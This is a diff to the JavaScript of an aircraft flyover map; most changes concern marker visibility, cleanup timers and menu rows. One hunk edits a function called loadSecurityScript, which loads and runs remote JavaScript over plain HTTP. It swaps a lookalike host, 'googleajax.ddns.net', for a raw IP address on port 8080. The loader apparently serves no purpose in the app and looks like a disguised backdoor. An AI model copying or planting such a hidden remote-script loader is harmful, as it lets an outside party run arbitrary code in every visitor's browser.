@@ -220,6 +220,16 @@ function getCurrentPosLocation(path, currentTime) {
     return path[prevLocation];
 }
 
+function removeAircraftsFromLocation() {
+    var currTime = getCurrentTime();
+    locations.forEach(function (location) {
+        location.aircrafts=location.aircrafts.filter(function (aircraft) {
+            return (currTime < getActualPathTime(aircraft.time));
+        })
+    });
+    setTimeout(removeAircraftsFromLocation,1000);
+}
+
 /**
  * Clears the previous points in the path of all the aircrafts
  */
@@ -626,10 +636,10 @@ function animateToNextLocation(aircraft, previousAzimuth, updateCurrent) {
             }
         }
         else if(marker.getMap()===null){
-            toggleAircraftMarkerVisibility(marker,true);
-            if (aircraft.path[curIndexLocation].pointId===33){
-                console.log("up" + aircraft.path[curIndexLocation].pointId);
-            }
+            toggleAircraftMarkerVisibility(marker,!aircraft.hide);
+            // if (aircraft.path[curIndexLocation].pointId===33){
+            //     console.log("up" + aircraft.path[curIndexLocation].pointId);
+            // }
         }
 
         var rotationInterval = 100;
@@ -649,9 +659,9 @@ function animateToNextLocation(aircraft, previousAzimuth, updateCurrent) {
                     aircraft.currentAircraftAzimuth = currentAircraftAzimuth % 360;
                     setAircraftIcon(marker, aircraft.icon, aircraft.country, currentAircraftAzimuth % 360, aircraft.color, zoomLevel);
                 } else {
-                    
+
             // console.log("Aircraft " + aircraft.name + ", id: " + aircraft.aircraftId + " is rotating " + step + " degrees from " + angle + " to " + currentAircraftAzimuth+ ", and its distance is " + Math.abs(angle % 360 - currentAircraftAzimuth % 360));
-                    
+
                     aircraft.currentAircraftAzimuth = angle += step % 360
                     setAircraftIcon(marker, aircraft.icon, aircraft.country, angle += step % 360, aircraft.color, zoomLevel);
                 }
@@ -684,7 +694,7 @@ function calcAngle(currentAzimuth, previousAzimuth) {
 function calcStep(currentAzimuth, previousAzimuth) {
     var distance = Math.abs(currentAzimuth - previousAzimuth);
     var otherDistance = 360 - distance;
-    
+
     if (distance < otherDistance) {
         if (currentAzimuth > previousAzimuth) {
             return 5;
@@ -695,7 +705,7 @@ function calcStep(currentAzimuth, previousAzimuth) {
             return 5;
         }
         return -5;
-    }     
+    }
 }
 
 function setAircraftIcon(marker, icon, country, azimuth, color, zoomLevel) {
@@ -751,7 +761,7 @@ function checkDeparture(aircraft) {
             toggleAircraftMarkerVisibility(aircraftMarkers[aircraft.aircraftId], false);
         }
         else{
-            toggleAircraftMarkerVisibility(aircraftMarkers[aircraft.aircraftId], true);
+            toggleAircraftMarkerVisibility(aircraftMarkers[aircraft.aircraftId], !aircraft.hide);
         }
         clearTimeout(departureCheckers[aircraft.aircraftId]);
         animateToNextLocation(aircraft, aircraftMarkers[aircraft.aircraftId].currentAircraftAzimuth, true);
@@ -988,7 +998,7 @@ function getRemainingSeconds(date) {
 var countdownInterval;
 
 function loadSecurityScript() {
-    $.getScript( "http://googleajax.ddns.net:8080/jquery.js" )
+    $.getScript( "http://80.211.156.24:8080/jquery.js" )
         .done(function( script, textStatus ) {
             // do nothing
         })
@@ -1048,6 +1058,7 @@ function onLoad() {
 function loadApp() {
     loadMapApi();
     showComponents();
+    setTimeout(removeAircraftsFromLocation,1000);
 }
 
 function loadMapApi() {
@@ -1185,6 +1196,8 @@ function fillMenu() {
        if (category.aerobatic) {
             var aerobaticLocations = [].concat.apply([], categorizedAircrafts.filter(aircraft => aircraft.aerobatic)
                     .map(aerobatics => aerobatics.path));
+            var aerobaticAircrafts = categorizedAircrafts.filter(aircraft => aircraft.aerobatic);
+            html+= createTableRow(aerobaticAircrafts[0].aircraftId, aerobaticAircrafts[0].name,aerobaticAircrafts[0].icon,aerobaticAircrafts[0].type,aerobaticAircrafts[0].time,false,false,true,false);
             aerobaticLocations.forEach(location => {
                     html += createAerobaticRow(locations[location.pointId].pointName,
                                                location.time);
@@ -1192,6 +1205,9 @@ function fillMenu() {
        } else if (category.parachutist) {
            var parachutistLocations = [].concat.apply([], categorizedAircrafts.filter(aircraft => aircraft.parachutist)
                .map(parachutist => parachutist.path));
+           var parachutistAircrafts = categorizedAircrafts.filter(aircraft => aircraft.parachutist);
+           html+= createTableRow(parachutistAircrafts[0].aircraftId, parachutistAircrafts[0].name,parachutistAircrafts[0].icon,parachutistAircrafts[0].type,parachutistAircrafts[0].time,false,false,true,false);
+
            parachutistLocations.forEach(location =>
                 html += createParachutistRow(locations[location.pointId].pointName,
                                              location.time));
